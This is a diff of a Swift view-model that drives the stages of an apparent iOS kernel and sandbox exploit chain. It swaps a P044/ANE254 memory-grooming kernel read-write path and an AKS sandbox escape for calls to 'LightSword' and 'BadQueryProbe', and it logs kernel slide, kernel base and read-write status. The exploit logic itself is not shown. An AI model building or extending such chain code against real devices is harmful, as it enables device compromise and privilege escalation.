@@ -3,11 +3,8 @@
 //  Fully wired to UI console
 //
 //  WIRE (this copy):
-//   - P044 prepare called for real via Lum1naKRW_Prepare (KRWBridge)
-//   - ANE254 handoff via Lum1naKRW_IntegrateP044 (no IMP casting, no NSErrorBox)
-//   - KRW scan via Lum1naKRW_Establish
-//   - plain init() for ANE254 (works through NSObject.Type)
-//   - removed: callIntegrate / callEstablishKRW / NSErrorBox helpers
+//   Home UI uses ExploitManager, not this type. KERNEL here is LightSword.
+//   P044 stays All-stages write-class. KRWBridge Prepare/Establish return NO.
 //
 
 import Foundation
@@ -135,142 +132,54 @@ class Lum1naViewModel: ObservableObject {
         isRunning = false
     }
     
-    // MARK: - KERNEL Stage (P044 groom → ANE254 handoff → KRW scan)
+    // MARK: - KERNEL Stage (LightSword KRW head — P044 is not this stage)
     private func executeKernel() async {
         exploitState = .executingKernel
-        log("[*] Stage: KERNEL (P044 ANE 254-Input → ANE254 KRW chain)", level: .info)
-        
-        guard let p044Class = NSClassFromString("P044ExploitController") as? NSObject.Type else {
-            log("[-] P044ExploitController not found", level: .error)
-            exploitState = .failed("P044 class not found")
+        log("[*] Stage: KERNEL (LightSword 64788-C → SocketKRW). P044 is write-class, All-stages only.", level: .info)
+
+        guard let lsClass = NSClassFromString("LightSword") as? NSObject.Type else {
+            log("[-] LightSword not found", level: .error)
+            exploitState = .failed("LightSword class not found")
             return
         }
-        
-        let controller = p044Class.init()
-        
-        // WIRE: real prepare call via KRWBridge (NSInvocation in ObjC)
-        log("[*] Preparing P044...", level: .info)
-        var prepareError: NSError?
-        let prepared = Lum1naKRW_Prepare(controller, &prepareError)
-        guard prepared else {
-            log("[-] P044 prepare failed: \(prepareError?.localizedDescription ?? "unknown")", level: .error)
-            exploitState = .failed("P044 prepare failed")
+        let tapSel = NSSelectorFromString("tap")
+        let meta: AnyObject = lsClass.self as AnyObject
+        guard meta.responds(to: tapSel), let result = meta.perform(tapSel),
+              let text = result.takeUnretainedValue() as? String, !text.isEmpty else {
+            log("[-] LightSword tap empty", level: .error)
+            exploitState = .failed("LightSword tap empty")
             return
         }
-        
-        log("[*] Executing P044 exploit (groom → fire → scan)...", level: .info)
-        let executeSel = NSSelectorFromString("execute")
-        var groomedHits = 0
-        if controller.responds(to: executeSel) {
-            let result = controller.perform(executeSel)
-            log("[+] P044 executed", level: .success)
-            
-            if let dict = result?.takeUnretainedValue() as? NSDictionary {
-                if let hits = dict["hits"] as? NSNumber {
-                    groomedHits = hits.intValue
-                    log("[*] P044 corruption hits: \(groomedHits)", level: .info)
-                }
-                if let slide = dict["kernelSlide"] as? NSNumber, slide.uint64Value != 0 {
-                    currentKernelSlide = slide.uint64Value
-                    log("[+] Kernel slide: 0x\(String(currentKernelSlide, radix: 16))", level: .success)
-                }
-                if let logOutput = dict["log"] as? NSString {
-                    log("[*] P044 Log:\n\(logOutput)", level: .info)
-                }
-            }
+        for line in text.components(separatedBy: "\n") where !line.isEmpty {
+            log(line, level: .info)
         }
-        
-        // WIRE: ANE254 handoff — transfer groomed pairs from P044 and scan
-        // for corrupted victims (KRW establishment) WITHOUT re-grooming/re-firing.
-        // NOTE: P044's execute() already freed holes and fired ANE, so ANE254
-        // only needs the pair array + victim scan.
-        guard let aneClass = NSClassFromString("ANE254InputController") as? NSObject.Type else {
-            log("[-] ANE254InputController not found", level: .error)
-            exploitState = .failed("ANE254 class not found")
-            return
-        }
-        
-        let ane = aneClass.init()
-        
-        // WIRE: integrateP044Results:error: via KRWBridge — wires pairs,
-        // sets shouldSkipPortCleanup on P044 (ownership transfer)
-        var integrateError: NSError?
-        let integrated = Lum1naKRW_IntegrateP044(ane, controller, &integrateError)
-        
-        if integrated {
-            log("[+] ANE254 handoff complete (pairs copied, P044 cleanup skipped)", level: .success)
-        } else {
-            log("[-] ANE254 handoff failed: \(integrateError?.localizedDescription ?? "unknown")", level: .error)
-            exploitState = .failed("ANE254 handoff failed")
-            // P044 still owns its ports — clean up normally
-            if controller.responds(to: NSSelectorFromString("cleanup")) {
-                controller.perform(NSSelectorFromString("cleanup"))
-            }
-            return
-        }
-        
-        // WIRE: establishKRWWithError: via KRWBridge — scans victims for
-        // corruption markers
-        var krwError: NSError?
-        let krwOK = Lum1naKRW_Establish(ane, &krwError)
-        
-        if krwOK {
-            // Pull results back through the readonly getters
-            let slide = (ane as NSObject).value(forKey: "kernelSlide") as? UInt64 ?? 0
-            let base = (ane as NSObject).value(forKey: "kernelBase") as? UInt64 ?? 0
-            let handle = (ane as NSObject).value(forKey: "krwHandle") as? UInt64 ?? 0
-            
-            if slide != 0 { currentKernelSlide = slide }
-            if base != 0 { currentKernelBase = base }
-            log("[+] KRW established — handle: 0x\(String(handle, radix: 16))", level: .success)
-            log("[+] Slide: 0x\(String(slide, radix: 16))", level: .success)
+        if text.contains("KRW LIVE") || text.contains("LightSword COMPLETE") {
+            log("[+] KERNEL: LightSword reported KRW + commitSlide", level: .success)
             exploitState = .success
         } else {
-            log("[-] KRW not established: \(krwError?.localizedDescription ?? "no corruption found in \(groomedHits) hits")", level: .error)
-            exploitState = .failed("KRW not established")
+            log("[*] KERNEL tap done — hasKread stays false until SocketKRW verify + commitSlide", level: .info)
+            exploitState = .failed("LightSword did not obtain KRW")
         }
-        
-        // ANE254 cleanup deallocates the co-owned ports exactly once
-        if ane.responds(to: NSSelectorFromString("cleanup")) {
-            ane.perform(NSSelectorFromString("cleanup"))
-        }
-        
-        log("[+] KERNEL stage complete", level: .success)
     }
     
-    // MARK: - SANDBOX Stage (AKS Exploit)
+    // MARK: - SANDBOX Stage (BadQuery file extension)
     private func executeSandbox() async {
         exploitState = .executingSandbox
-        log("[*] Stage: SANDBOX (AKS CVE-2026-65343)", level: .info)
+        log("[*] Stage: SANDBOX (BadQuery file extension, not AKS)", level: .info)
         
-        guard let aksClass = NSClassFromString("AKSExploitController") as? NSObject.Type else {
-            log("[-] AKSExploitController not found", level: .error)
-            exploitState = .failed("AKS class not found")
+        guard let bqClass = NSClassFromString("BadQueryProbe") as? NSObject.Type else {
+            log("[-] BadQueryProbe not found", level: .error)
+            exploitState = .failed("BadQuery class not found")
             return
         }
-        
-        let controller = aksClass.init()
-        
-        let prepareSel = NSSelectorFromString("prepare")
-        if controller.responds(to: prepareSel) {
-            _ = controller.perform(prepareSel)
-        }
-        
-        log("[*] Executing AKS exploit...", level: .info)
-        let executeSel = NSSelectorFromString("execute")
-        if controller.responds(to: executeSel) {
-            let result = controller.perform(executeSel)
-            log("[+] AKS executed", level: .success)
-            
-            if let dict = result?.takeUnretainedValue() as? NSDictionary {
-                if let success = dict["success"] as? NSNumber, success.boolValue {
-                    log("[+] Sandbox escaped", level: .success)
-                } else {
-                    log("[-] Sandbox escape failed", level: .error)
-                }
+        let tapSel = NSSelectorFromString("tap")
+        let meta: AnyObject = bqClass.self as AnyObject
+        if meta.responds(to: tapSel), let result = meta.perform(tapSel),
+           let text = result.takeUnretainedValue() as? String {
+            for line in text.components(separatedBy: "\n") where !line.isEmpty {
+                log(line, level: .info)
             }
         }
-        
         exploitState = .success
     }
     
@@ -303,9 +212,7 @@ class Lum1naViewModel: ObservableObject {
         
         await executePatchset()
         
-        if case .success = exploitState {
-            log("[+] Full chain complete!", level: .success)
-        }
+        log("[*] FULL CHAIN ended — kreadbuf not obtained unless LightSword commitSlide landed", level: .info)
     }
     
     func reset() {
